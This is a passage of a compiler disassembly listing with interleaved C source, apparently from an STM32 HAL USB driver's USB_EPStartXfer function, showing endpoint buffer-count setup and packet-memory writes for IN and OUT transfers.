 80074fe:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 8007502:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8007506:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 800750a:	6800      	ldr	r0, [r0, #0]
 800750c:	f000 ff41 	bl	8008392 <USB_WritePMA>
 8007510:	e0ca      	b.n	80076a8 <USB_EPStartXfer+0xd2e>
        }
        else
        {
          /* Set the Double buffer counter for pmabuffer0 */
          PCD_SET_EP_DBUF0_CNT(USBx, ep->num, ep->is_in, len);
 8007512:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007516:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800751a:	681b      	ldr	r3, [r3, #0]
 800751c:	785b      	ldrb	r3, [r3, #1]
 800751e:	2b00      	cmp	r3, #0
 8007520:	d177      	bne.n	8007612 <USB_EPStartXfer+0xc98>
 8007522:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007526:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800752a:	681b      	ldr	r3, [r3, #0]
 800752c:	67fb      	str	r3, [r7, #124]	; 0x7c
 800752e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007532:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007536:	681b      	ldr	r3, [r3, #0]
 8007538:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800753c:	b29b      	uxth	r3, r3
 800753e:	461a      	mov	r2, r3
 8007540:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 8007542:	4413      	add	r3, r2
 8007544:	67fb      	str	r3, [r7, #124]	; 0x7c
 8007546:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800754a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800754e:	681b      	ldr	r3, [r3, #0]
 8007550:	781b      	ldrb	r3, [r3, #0]
 8007552:	00da      	lsls	r2, r3, #3
 8007554:	6ffb      	ldr	r3, [r7, #124]	; 0x7c
 8007556:	4413      	add	r3, r2
 8007558:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800755c:	67bb      	str	r3, [r7, #120]	; 0x78
 800755e:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007560:	881b      	ldrh	r3, [r3, #0]
 8007562:	b29b      	uxth	r3, r3
 8007564:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007568:	b29a      	uxth	r2, r3
 800756a:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800756c:	801a      	strh	r2, [r3, #0]
 800756e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007572:	2b3e      	cmp	r3, #62	; 0x3e
 8007574:	d921      	bls.n	80075ba <USB_EPStartXfer+0xc40>
 8007576:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800757a:	095b      	lsrs	r3, r3, #5
 800757c:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007580:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007584:	f003 031f 	and.w	r3, r3, #31
 8007588:	2b00      	cmp	r3, #0
 800758a:	d104      	bne.n	8007596 <USB_EPStartXfer+0xc1c>
 800758c:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007590:	3b01      	subs	r3, #1
 8007592:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 8007596:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 8007598:	881b      	ldrh	r3, [r3, #0]
 800759a:	b29a      	uxth	r2, r3
 800759c:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 80075a0:	b29b      	uxth	r3, r3
 80075a2:	029b      	lsls	r3, r3, #10
 80075a4:	b29b      	uxth	r3, r3
 80075a6:	4313      	orrs	r3, r2
 80075a8:	b29b      	uxth	r3, r3
 80075aa:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80075ae:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80075b2:	b29a      	uxth	r2, r3
 80075b4:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80075b6:	801a      	strh	r2, [r3, #0]
 80075b8:	e05c      	b.n	8007674 <USB_EPStartXfer+0xcfa>
 80075ba:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80075be:	2b00      	cmp	r3, #0
 80075c0:	d10a      	bne.n	80075d8 <USB_EPStartXfer+0xc5e>
 80075c2:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80075c4:	881b      	ldrh	r3, [r3, #0]
 80075c6:	b29b      	uxth	r3, r3
 80075c8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80075cc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80075d0:	b29a      	uxth	r2, r3
 80075d2:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80075d4:	801a      	strh	r2, [r3, #0]
 80075d6:	e04d      	b.n	8007674 <USB_EPStartXfer+0xcfa>
 80075d8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80075dc:	085b      	lsrs	r3, r3, #1
 80075de:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 80075e2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80075e6:	f003 0301 	and.w	r3, r3, #1
 80075ea:	2b00      	cmp	r3, #0
 80075ec:	d004      	beq.n	80075f8 <USB_EPStartXfer+0xc7e>
 80075ee:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 80075f2:	3301      	adds	r3, #1
 80075f4:	f8c7 30ec 	str.w	r3, [r7, #236]	; 0xec
 80075f8:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 80075fa:	881b      	ldrh	r3, [r3, #0]
 80075fc:	b29a      	uxth	r2, r3
 80075fe:	f8d7 30ec 	ldr.w	r3, [r7, #236]	; 0xec
 8007602:	b29b      	uxth	r3, r3
 8007604:	029b      	lsls	r3, r3, #10
 8007606:	b29b      	uxth	r3, r3
 8007608:	4313      	orrs	r3, r2
 800760a:	b29a      	uxth	r2, r3
 800760c:	6fbb      	ldr	r3, [r7, #120]	; 0x78
 800760e:	801a      	strh	r2, [r3, #0]
 8007610:	e030      	b.n	8007674 <USB_EPStartXfer+0xcfa>
 8007612:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007616:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800761a:	681b      	ldr	r3, [r3, #0]
 800761c:	785b      	ldrb	r3, [r3, #1]
 800761e:	2b01      	cmp	r3, #1
 8007620:	d128      	bne.n	8007674 <USB_EPStartXfer+0xcfa>
 8007622:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007626:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800762a:	681b      	ldr	r3, [r3, #0]
 800762c:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 8007630:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007634:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007638:	681b      	ldr	r3, [r3, #0]
 800763a:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800763e:	b29b      	uxth	r3, r3
 8007640:	461a      	mov	r2, r3
 8007642:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 8007646:	4413      	add	r3, r2
 8007648:	f8c7 3084 	str.w	r3, [r7, #132]	; 0x84
 800764c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007650:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007654:	681b      	ldr	r3, [r3, #0]
 8007656:	781b      	ldrb	r3, [r3, #0]
 8007658:	00da      	lsls	r2, r3, #3
 800765a:	f8d7 3084 	ldr.w	r3, [r7, #132]	; 0x84
 800765e:	4413      	add	r3, r2
 8007660:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007664:	f8c7 3080 	str.w	r3, [r7, #128]	; 0x80
 8007668:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800766c:	b29a      	uxth	r2, r3
 800766e:	f8d7 3080 	ldr.w	r3, [r7, #128]	; 0x80
 8007672:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 8007674:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007678:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800767c:	681b      	ldr	r3, [r3, #0]
 800767e:	891b      	ldrh	r3, [r3, #8]
 8007680:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 8007684:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007688:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800768c:	681b      	ldr	r3, [r3, #0]
 800768e:	6959      	ldr	r1, [r3, #20]
 8007690:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007694:	b29b      	uxth	r3, r3
 8007696:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 800769a:	f507 7084 	add.w	r0, r7, #264	; 0x108
 800769e:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80076a2:	6800      	ldr	r0, [r0, #0]
 80076a4:	f000 fe75 	bl	8008392 <USB_WritePMA>
        }
      }
    }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

    PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_VALID);
 80076a8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076ac:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80076b0:	681a      	ldr	r2, [r3, #0]
 80076b2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076b6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80076ba:	681b      	ldr	r3, [r3, #0]
 80076bc:	781b      	ldrb	r3, [r3, #0]
 80076be:	009b      	lsls	r3, r3, #2
 80076c0:	4413      	add	r3, r2
 80076c2:	881b      	ldrh	r3, [r3, #0]
 80076c4:	b29b      	uxth	r3, r3
 80076c6:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 80076ca:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 80076ce:	817b      	strh	r3, [r7, #10]
 80076d0:	897b      	ldrh	r3, [r7, #10]
 80076d2:	f083 0310 	eor.w	r3, r3, #16
 80076d6:	817b      	strh	r3, [r7, #10]
 80076d8:	897b      	ldrh	r3, [r7, #10]
 80076da:	f083 0320 	eor.w	r3, r3, #32
 80076de:	817b      	strh	r3, [r7, #10]
 80076e0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076e4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80076e8:	681a      	ldr	r2, [r3, #0]
 80076ea:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80076ee:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80076f2:	681b      	ldr	r3, [r3, #0]
 80076f4:	781b      	ldrb	r3, [r3, #0]
 80076f6:	009b      	lsls	r3, r3, #2
 80076f8:	441a      	add	r2, r3
 80076fa:	897b      	ldrh	r3, [r7, #10]
 80076fc:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007700:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007704:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007708:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 800770c:	b29b      	uxth	r3, r3
 800770e:	8013      	strh	r3, [r2, #0]
 8007710:	f000 bcde 	b.w	80080d0 <USB_EPStartXfer+0x1756>
  }
  else /* OUT endpoint */
  {
    if (ep->doublebuffer == 0U)
 8007714:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007718:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800771c:	681b      	ldr	r3, [r3, #0]
 800771e:	7b1b      	ldrb	r3, [r3, #12]
 8007720:	2b00      	cmp	r3, #0
 8007722:	f040 80bb 	bne.w	800789c <USB_EPStartXfer+0xf22>
    {
      /* Multi packet transfer */
      if (ep->xfer_len > ep->maxpacket)
 8007726:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800772a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800772e:	681b      	ldr	r3, [r3, #0]
 8007730:	699a      	ldr	r2, [r3, #24]
 8007732:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007736:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800773a:	681b      	ldr	r3, [r3, #0]
 800773c:	691b      	ldr	r3, [r3, #16]
 800773e:	429a      	cmp	r2, r3
 8007740:	d917      	bls.n	8007772 <USB_EPStartXfer+0xdf8>
      {
        len = ep->maxpacket;
 8007742:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007746:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800774a:	681b      	ldr	r3, [r3, #0]
 800774c:	691b      	ldr	r3, [r3, #16]
 800774e:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len -= len;
 8007752:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007756:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800775a:	681b      	ldr	r3, [r3, #0]
 800775c:	699a      	ldr	r2, [r3, #24]
 800775e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007762:	1ad2      	subs	r2, r2, r3
 8007764:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007768:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800776c:	681b      	ldr	r3, [r3, #0]
 800776e:	619a      	str	r2, [r3, #24]
 8007770:	e00e      	b.n	8007790 <USB_EPStartXfer+0xe16>
      }
      else
      {
        len = ep->xfer_len;
 8007772:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007776:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800777a:	681b      	ldr	r3, [r3, #0]
 800777c:	699b      	ldr	r3, [r3, #24]
 800777e:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
        ep->xfer_len = 0U;
 8007782:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007786:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800778a:	681b      	ldr	r3, [r3, #0]
 800778c:	2200      	movs	r2, #0
 800778e:	619a      	str	r2, [r3, #24]
      }
      /* configure and validate Rx endpoint */
      PCD_SET_EP_RX_CNT(USBx, ep->num, len);
 8007790:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007794:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007798:	681b      	ldr	r3, [r3, #0]
 800779a:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 800779e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077a2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80077a6:	681b      	ldr	r3, [r3, #0]
 80077a8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80077ac:	b29b      	uxth	r3, r3
 80077ae:	461a      	mov	r2, r3
 80077b0:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 80077b4:	4413      	add	r3, r2
 80077b6:	f8c7 3090 	str.w	r3, [r7, #144]	; 0x90
 80077ba:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80077be:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80077c2:	681b      	ldr	r3, [r3, #0]
 80077c4:	781b      	ldrb	r3, [r3, #0]
 80077c6:	00da      	lsls	r2, r3, #3
 80077c8:	f8d7 3090 	ldr.w	r3, [r7, #144]	; 0x90
 80077cc:	4413      	add	r3, r2
 80077ce:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80077d2:	f8c7 308c 	str.w	r3, [r7, #140]	; 0x8c
 80077d6:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80077da:	881b      	ldrh	r3, [r3, #0]
 80077dc:	b29b      	uxth	r3, r3
 80077de:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80077e2:	b29a      	uxth	r2, r3
 80077e4:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 80077e8:	801a      	strh	r2, [r3, #0]
 80077ea:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80077ee:	2b3e      	cmp	r3, #62	; 0x3e
 80077f0:	d924      	bls.n	800783c <USB_EPStartXfer+0xec2>
 80077f2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80077f6:	095b      	lsrs	r3, r3, #5
 80077f8:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 80077fc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007800:	f003 031f 	and.w	r3, r3, #31
 8007804:	2b00      	cmp	r3, #0
 8007806:	d104      	bne.n	8007812 <USB_EPStartXfer+0xe98>
 8007808:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 800780c:	3b01      	subs	r3, #1
 800780e:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007812:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007816:	881b      	ldrh	r3, [r3, #0]
 8007818:	b29a      	uxth	r2, r3
 800781a:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 800781e:	b29b      	uxth	r3, r3
 8007820:	029b      	lsls	r3, r3, #10
 8007822:	b29b      	uxth	r3, r3
 8007824:	4313      	orrs	r3, r2
 8007826:	b29b      	uxth	r3, r3
 8007828:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800782c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007830:	b29a      	uxth	r2, r3
 8007832:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007836:	801a      	strh	r2, [r3, #0]
 8007838:	f000 bc10 	b.w	800805c <USB_EPStartXfer+0x16e2>
 800783c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007840:	2b00      	cmp	r3, #0
 8007842:	d10c      	bne.n	800785e <USB_EPStartXfer+0xee4>
 8007844:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007848:	881b      	ldrh	r3, [r3, #0]
 800784a:	b29b      	uxth	r3, r3
 800784c:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007850:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007854:	b29a      	uxth	r2, r3
 8007856:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 800785a:	801a      	strh	r2, [r3, #0]
 800785c:	e3fe      	b.n	800805c <USB_EPStartXfer+0x16e2>
 800785e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007862:	085b      	lsrs	r3, r3, #1
 8007864:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 8007868:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800786c:	f003 0301 	and.w	r3, r3, #1
 8007870:	2b00      	cmp	r3, #0
 8007872:	d004      	beq.n	800787e <USB_EPStartXfer+0xf04>
 8007874:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 8007878:	3301      	adds	r3, #1
 800787a:	f8c7 30e8 	str.w	r3, [r7, #232]	; 0xe8
 800787e:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007882:	881b      	ldrh	r3, [r3, #0]
 8007884:	b29a      	uxth	r2, r3
 8007886:	f8d7 30e8 	ldr.w	r3, [r7, #232]	; 0xe8
 800788a:	b29b      	uxth	r3, r3
 800788c:	029b      	lsls	r3, r3, #10
 800788e:	b29b      	uxth	r3, r3
 8007890:	4313      	orrs	r3, r2
 8007892:	b29a      	uxth	r2, r3
 8007894:	f8d7 308c 	ldr.w	r3, [r7, #140]	; 0x8c
 8007898:	801a      	strh	r2, [r3, #0]
 800789a:	e3df      	b.n	800805c <USB_EPStartXfer+0x16e2>
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* First Transfer Coming From HAL_PCD_EP_Receive & From ISR */
      /* Set the Double buffer counter */
      if (ep->type == EP_TYPE_BULK)
 800789c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80078a0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80078a4:	681b      	ldr	r3, [r3, #0]
 80078a6:	78db      	ldrb	r3, [r3, #3]
 80078a8:	2b02      	cmp	r3, #2
 80078aa:	f040 8218 	bne.w	8007cde <USB_EPStartXfer+0x1364>
      {
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, ep->maxpacket);
 80078ae:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80078b2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80078b6:	681b      	ldr	r3, [r3, #0]
 80078b8:	785b      	ldrb	r3, [r3, #1]
 80078ba:	2b00      	cmp	r3, #0
 80078bc:	f040 809d 	bne.w	80079fa <USB_EPStartXfer+0x1080>
 80078c0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80078c4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80078c8:	681b      	ldr	r3, [r3, #0]
 80078ca:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 80078ce:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80078d2:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80078d6:	681b      	ldr	r3, [r3, #0]
 80078d8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80078dc:	b29b      	uxth	r3, r3
 80078de:	461a      	mov	r2, r3
 80078e0:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 80078e4:	4413      	add	r3, r2
 80078e6:	f8c7 30ac 	str.w	r3, [r7, #172]	; 0xac
 80078ea:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80078ee:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80078f2:	681b      	ldr	r3, [r3, #0]
 80078f4:	781b      	ldrb	r3, [r3, #0]
 80078f6:	00da      	lsls	r2, r3, #3
 80078f8:	f8d7 30ac 	ldr.w	r3, [r7, #172]	; 0xac
 80078fc:	4413      	add	r3, r2
 80078fe:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007902:	f8c7 30a8 	str.w	r3, [r7, #168]	; 0xa8
 8007906:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 800790a:	881b      	ldrh	r3, [r3, #0]
 800790c:	b29b      	uxth	r3, r3
 800790e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007912:	b29a      	uxth	r2, r3
 8007914:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007918:	801a      	strh	r2, [r3, #0]
 800791a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800791e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007922:	681b      	ldr	r3, [r3, #0]
 8007924:	691b      	ldr	r3, [r3, #16]
 8007926:	2b3e      	cmp	r3, #62	; 0x3e
 8007928:	d92b      	bls.n	8007982 <USB_EPStartXfer+0x1008>
 800792a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800792e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007932:	681b      	ldr	r3, [r3, #0]
 8007934:	691b      	ldr	r3, [r3, #16]
 8007936:	095b      	lsrs	r3, r3, #5
 8007938:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 800793c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007940:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007944:	681b      	ldr	r3, [r3, #0]
 8007946:	691b      	ldr	r3, [r3, #16]
 8007948:	f003 031f 	and.w	r3, r3, #31
 800794c:	2b00      	cmp	r3, #0
 800794e:	d104      	bne.n	800795a <USB_EPStartXfer+0xfe0>
 8007950:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007954:	3b01      	subs	r3, #1
 8007956:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 800795a:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 800795e:	881b      	ldrh	r3, [r3, #0]
 8007960:	b29a      	uxth	r2, r3
 8007962:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007966:	b29b      	uxth	r3, r3
 8007968:	029b      	lsls	r3, r3, #10
 800796a:	b29b      	uxth	r3, r3
 800796c:	4313      	orrs	r3, r2
 800796e:	b29b      	uxth	r3, r3
 8007970:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007974:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007978:	b29a      	uxth	r2, r3
 800797a:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 800797e:	801a      	strh	r2, [r3, #0]
 8007980:	e070      	b.n	8007a64 <USB_EPStartXfer+0x10ea>
 8007982:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007986:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800798a:	681b      	ldr	r3, [r3, #0]
 800798c:	691b      	ldr	r3, [r3, #16]
 800798e:	2b00      	cmp	r3, #0
 8007990:	d10c      	bne.n	80079ac <USB_EPStartXfer+0x1032>
 8007992:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007996:	881b      	ldrh	r3, [r3, #0]
 8007998:	b29b      	uxth	r3, r3
 800799a:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800799e:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80079a2:	b29a      	uxth	r2, r3
 80079a4:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 80079a8:	801a      	strh	r2, [r3, #0]
 80079aa:	e05b      	b.n	8007a64 <USB_EPStartXfer+0x10ea>
 80079ac:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079b0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079b4:	681b      	ldr	r3, [r3, #0]
 80079b6:	691b      	ldr	r3, [r3, #16]
 80079b8:	085b      	lsrs	r3, r3, #1
 80079ba:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 80079be:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079c2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80079c6:	681b      	ldr	r3, [r3, #0]
 80079c8:	691b      	ldr	r3, [r3, #16]
 80079ca:	f003 0301 	and.w	r3, r3, #1
 80079ce:	2b00      	cmp	r3, #0
 80079d0:	d004      	beq.n	80079dc <USB_EPStartXfer+0x1062>
 80079d2:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 80079d6:	3301      	adds	r3, #1
 80079d8:	f8c7 30e4 	str.w	r3, [r7, #228]	; 0xe4
 80079dc:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 80079e0:	881b      	ldrh	r3, [r3, #0]
 80079e2:	b29a      	uxth	r2, r3
 80079e4:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 80079e8:	b29b      	uxth	r3, r3
 80079ea:	029b      	lsls	r3, r3, #10
 80079ec:	b29b      	uxth	r3, r3
 80079ee:	4313      	orrs	r3, r2
 80079f0:	b29a      	uxth	r2, r3
 80079f2:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 80079f6:	801a      	strh	r2, [r3, #0]
 80079f8:	e034      	b.n	8007a64 <USB_EPStartXfer+0x10ea>
 80079fa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80079fe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a02:	681b      	ldr	r3, [r3, #0]
 8007a04:	785b      	ldrb	r3, [r3, #1]
 8007a06:	2b01      	cmp	r3, #1
 8007a08:	d12c      	bne.n	8007a64 <USB_EPStartXfer+0x10ea>
 8007a0a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a0e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007a12:	681b      	ldr	r3, [r3, #0]
 8007a14:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007a18:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a1c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007a20:	681b      	ldr	r3, [r3, #0]
 8007a22:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007a26:	b29b      	uxth	r3, r3
 8007a28:	461a      	mov	r2, r3
 8007a2a:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007a2e:	4413      	add	r3, r2
 8007a30:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007a34:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a38:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a3c:	681b      	ldr	r3, [r3, #0]
 8007a3e:	781b      	ldrb	r3, [r3, #0]
 8007a40:	00da      	lsls	r2, r3, #3
 8007a42:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007a46:	4413      	add	r3, r2
 8007a48:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007a4c:	f8c7 30b0 	str.w	r3, [r7, #176]	; 0xb0
 8007a50:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a54:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a58:	681b      	ldr	r3, [r3, #0]
 8007a5a:	691b      	ldr	r3, [r3, #16]
 8007a5c:	b29a      	uxth	r2, r3
 8007a5e:	f8d7 30b0 	ldr.w	r3, [r7, #176]	; 0xb0
 8007a62:	801a      	strh	r2, [r3, #0]
 8007a64:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a68:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007a6c:	681b      	ldr	r3, [r3, #0]
